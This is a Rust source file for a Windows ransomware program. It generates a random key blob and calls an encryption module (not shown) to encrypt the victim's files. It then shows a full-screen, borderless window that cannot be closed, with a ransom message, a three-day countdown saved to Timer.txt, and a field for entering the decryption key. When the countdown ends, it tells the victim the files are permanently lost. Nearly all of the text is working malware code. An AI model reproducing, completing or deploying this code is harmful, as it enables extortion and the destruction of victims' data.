#![allow(non_snake_case)]
#![allow(unused_variables)]
use iced::{
    executor, window, Alignment, Application, Border, Color, Command, Element, Length, Settings, Shadow, Theme, Vector
};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use iced::widget::{Container, Row, Text, TextInput, Button, Column};
use winapi::um::winuser::GetSystemMetrics;
use std::{thread, time::Duration};
use winapi::um::fileapi::{ReadFile, CreateFileA, WriteFile,CREATE_ALWAYS,OPEN_EXISTING};
use winapi::um::winnt::{GENERIC_READ, FILE_ATTRIBUTE_NORMAL, GENERIC_WRITE};
use std::ptr;
use std::ffi::CString;
use rand::Rng;
use base64::{Engine as _, engine::general_purpose};
mod FileTraversing;
mod EncryptionDecryption;
mod Client;
unsafe fn read_and_parse_file(filename: CString) -> Result<Duration, String> {
    let file_handle = CreateFileA(
        filename.as_ptr(),
        GENERIC_READ,
        0,
        ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        ptr::null_mut(),
    );

    if file_handle.is_null() {
        let error_code = GetLastError();
        return Err(format!("Error opening file. Error code: {}", error_code));
    }

    let mut buffer: Vec<u8> = vec![0; 100]; 
    let mut bytes_read: u32 = 0;

    let read_result = ReadFile(
        file_handle,
        buffer.as_mut_ptr() as *mut _,
        buffer.len() as u32,
        &mut bytes_read,
        ptr::null_mut(),
    );

    if read_result == 0 {
        let error_code = GetLastError();
        CloseHandle(file_handle);
        return Err(format!("Failed to read file. Error code: {}", error_code));
    }

    let file_contents = String::from_utf8_lossy(&buffer[..bytes_read as usize]);

    let cleaned_contents = file_contents.trim().chars().filter(|c| c.is_digit(10)).collect::<String>();

    if let Ok(seconds) = cleaned_contents.parse::<u64>() {
        CloseHandle(file_handle);
        Ok(Duration::new(seconds, 0))
    } else {
        CloseHandle(file_handle);
        Err("Failed to parse file contents as u64".to_string())
    }
}

struct MyApp {
    remaining_time: Duration, 
    message_text: String,     
    input_text: String,       
}

#[derive(Debug, Clone)]
enum Message {
    Tick, 
    Submit, 
    InputChanged(String), 
    Exit,
}

impl Application for MyApp {
    type Executor = executor::Default;
    type Message = Message;
    type Theme = Theme;
    type Flags = ();

    fn new(_flags: Self::Flags) -> (Self, Command<Self::Message>) {
        let filename = CString::new("Timer.txt").unwrap();
        let mut remaining_time = Duration::new(3 * 24 * 3600, 0); // Default to 3 days

        match unsafe { read_and_parse_file(filename) } {
            Ok(parsed_time) => {
                remaining_time = parsed_time;
            }
            Err(error_message) =>{}
        }

        (
            MyApp {
                remaining_time,
                message_text: String::from(
                    "What happened to your files?\n\nAll your important files, including documents, photos, and other valuable data, have been **encrypted** using a strong cryptographic algorithm."
                ),
                input_text: String::new(),
            },
            Command::perform(async { thread::sleep(Duration::from_secs(1)) }, |_| Message::Tick),
        )
    }

    fn title(&self) -> String {
        String::from("")
    }

    fn update(&mut self, message: Self::Message) -> Command<Self::Message> {
        match message {
            Message::Tick => {

                if self.remaining_time > Duration::from_secs(0) {
                    let filename = CString::new("Timer.txt").unwrap();
                    let write_data=CString::new(format!("{:?}",self.remaining_time)).unwrap();
                    unsafe {
                        creat_file(filename, write_data);
                    }
                    self.remaining_time -= Duration::from_secs(1);
                }

                if self.remaining_time == Duration::from_secs(0) {
                    self.message_text = String::from("You have not entered the decryption key and so the decryption key will not be provided. \nYour files are permanently lost with the encryption. \nThey can't be recovered as they are encrypted with better cryptographic algorithms.\nThank you...");
                }

                if self.remaining_time > Duration::from_secs(0) {
                    Command::perform(async { thread::sleep(Duration::from_secs(1)) }, |_| Message::Tick)
                } else {
                    Command::none() 
                }
            }
            Message::Submit => {
                let encoded_key = self.input_text.trim();
                let mut result:i32=0;
                let decoded_blob = match general_purpose::STANDARD.decode(&encoded_key) {
                    Ok(blob) => {
                        let BLOB_BUFFER:[u8;36]=blob.try_into().unwrap();
                        result = FileTraversing::csp(false,BLOB_BUFFER);
                    }
                    Err(_) => {
                        self.message_text.push_str(&format!("Not the key bud"));
                        self.input_text.clear();
                    }
                };
                if self.input_text.trim().to_lowercase() == "exit" || result==1{
                    return Command::perform(async {}, |_| Message::Exit);
                }
                Command::none()
            }
            Message::InputChanged(new_text) => {
                self.input_text.push_str(&new_text);
                Command::none()
            }
            Message::Exit => {
                std::process::exit(0);
            }
            
        }
    }

    fn view(&self) -> Element<Self::Message> {

        let total_secs = self.remaining_time.as_secs();
        let days = total_secs / 86400; 
        let hours = (total_secs % 86400) / 3600;
        let minutes = (total_secs % 3600) / 60;
        let seconds = total_secs % 60;
    

        let timer_text = format!("{:02}d {:02}h {:02}m {:02}s", days, hours, minutes, seconds);
    
        
        let left_part: Container<Message> = Container::new(
            Text::new(timer_text) 
                .size(50)
                .style(iced::theme::Text::Color(Color::WHITE)),
        )
        .width(Length::FillPortion(1)) 
        .height(Length::Fill) 
        .center_x() 
        .center_y() 
        .style(iced::theme::Container::Custom(Box::new(LeftContainerStyle)));
    
        let mut right_column = Column::new()
    .push(
        Text::new(&self.message_text)
            .size(30)
            .style(iced::theme::Text::Color(Color::from_rgb(0.0, 0.0, 0.0))),
    )
    .spacing(40) 
    .align_items(Alignment::Start) 
    .width(Length::FillPortion(1)) 
    .height(Length::Shrink); 

        if total_secs > 0 {
            
            let input_row = Row::new()
                .push(
                    TextInput::new(
                        &self.input_text,  
                        "",   
                    )
                    .on_input(|new_text| Message::InputChanged(new_text)) // Handle input change
                    .padding(10) 
                    .size(20)    
                    .width(Length::FillPortion(3)), 
                )
                .push(
                    Button::new(Text::new("Decrypt"))
                        .padding(iced::Padding {
                            top: 10.0,
                            bottom: 10.0,
                            right: 10.0,
                            left: 10.0,
                        }) 
                        .on_press(Message::Submit)
                        .width(Length::FillPortion(1)), 
                )
                .spacing(20) 
                .align_items(Alignment::Center);
    
            right_column = right_column.push(input_row); 
        }
    
        let right_part: Container<Message> = Container::new(right_column)
            .width(Length::FillPortion(3)) 
            .height(Length::Fill)
            .padding(iced::Padding {
                top: 400.0,   
                bottom: 0.0,   
                left: 20.0,   
                right: 20.0,   
            })
            .style(iced::theme::Container::Custom(Box::new(RightContainerStyle)));
    
        Row::new()
            .push(left_part)
            .push(right_part)
            .width(Length::Fill)
            .height(Length::Fill)
            .into()
    }

}

struct LeftContainerStyle;
impl iced::widget::container::StyleSheet for LeftContainerStyle {
    type Style = Theme;

    fn appearance(&self, _theme: &Self::Style) -> iced::widget::container::Appearance {
        iced::widget::container::Appearance {
            background: Some(iced::Background::Color(Color::from_rgb(0.5, 0.0, 0.0))), // Red background
            border: Border {
                color: Color::TRANSPARENT,
                width: 0.0.into(),
                radius: 0.0.into(),
            },
            shadow: Shadow {
                color: Color::TRANSPARENT,
                offset: Vector { x: 0.5.into(), y: 1.0.into() },
                blur_radius: 0.4.into(),
            },
            text_color: None,
        }
    }
}

struct RightContainerStyle;
impl iced::widget::container::StyleSheet for RightContainerStyle {
    type Style = Theme;

    fn appearance(&self, _theme: &Self::Style) -> iced::widget::container::Appearance {
        iced::widget::container::Appearance {
            background: Some(iced::Background::Color(Color::from_rgb(1.0, 1.0, 1.0))), // White background
            border: Border {
                color: Color::TRANSPARENT,
                width: 0.0.into(),
                radius: 0.0.into(),
            },
            shadow: Shadow {
                color: Color::TRANSPARENT,
                offset: Vector { x: 0.0.into(), y: 0.0.into() },
                blur_radius: 0.0.into(),
            },
            text_color: None,
        }
    }
}

unsafe fn creat_file(filename: CString, write_data: CString) {

    let create_txt_file = CreateFileA(
        filename.as_ptr(),
        GENERIC_WRITE,      
        0,                  
        ptr::null_mut(),
        CREATE_ALWAYS,      
        FILE_ATTRIBUTE_NORMAL,
        ptr::null_mut(),
    );


    if create_txt_file.is_null() {
        let error = GetLastError();
        return;
    }

    let buffer: Vec<u8> = write_data.as_bytes().to_vec();
    let mut bytes_written: u32 = 0;

    let write_txt_file = WriteFile(
        create_txt_file,
        buffer.as_ptr() as *const _,
        buffer.len() as u32,
        &mut bytes_written,
        ptr::null_mut(),
    );

    
    if write_txt_file == 0 {
        CloseHandle(create_txt_file);  
        return;
    }

    CloseHandle(create_txt_file);
}
unsafe fn Create_check_file(){
    let filename = CString::new("dont_delete.txt").expect("CString::new failed");
    let write_data = CString::new("watchyou").expect("CString::new failed");
    creat_file(filename, write_data);
    let mut BLOB_BUFFER: [u8; 36] = [
        8, 2, 0, 0, 15, 102, 0, 0, 24, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    ];
    let mut rng = rand::thread_rng();
    for i in 12..36{
        let random_number: u8 = rng.gen_range(0..100);
        BLOB_BUFFER[i]=random_number;
    }
    let result  = FileTraversing::csp(true,BLOB_BUFFER);
}
fn main() -> iced::Result {
    let screen_width;
    let screen_height;
    unsafe{
        let check_txt_path = CString::new("dont_delete.txt").expect("CString::new failed");
        let check_txt_file = CreateFileA(
            check_txt_path.as_ptr(),
            GENERIC_READ,
            0,
            ptr::null_mut(),
            3,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        );
        if !check_txt_file.is_null() {
            let mut buffer: Vec<u8> = vec![0; 100]; 
            let mut bytes_read: u32 = 0; 
            let chech_string = "watchyou";
            let result = ReadFile(
                check_txt_file,
                buffer.as_mut_ptr() as *mut _,
                buffer.len() as u32,
                &mut bytes_read,
                ptr::null_mut(),
            );
            let file_contents = String::from_utf8_lossy(&buffer[..bytes_read as usize]);
            if file_contents!= chech_string {
                Create_check_file();
            } 
        }
        else{
            Create_check_file();
        }
    }
    unsafe {
        screen_width = GetSystemMetrics(0); 
        screen_height = GetSystemMetrics(1); 
    }

    MyApp::run(Settings {
            window: window::Settings {
                size: iced::Size::new(screen_width as f32, screen_height as f32),
                position: window::Position::Centered,
                resizable: false,
                decorations: false,
                visible: true,
                transparent: false,
                level: window::Level::Normal,
                exit_on_close_request: false,
                icon: None,
                max_size: None,
                min_size: None,
                platform_specific: Default::default(),
            },
            ..Settings::default()
        })
}

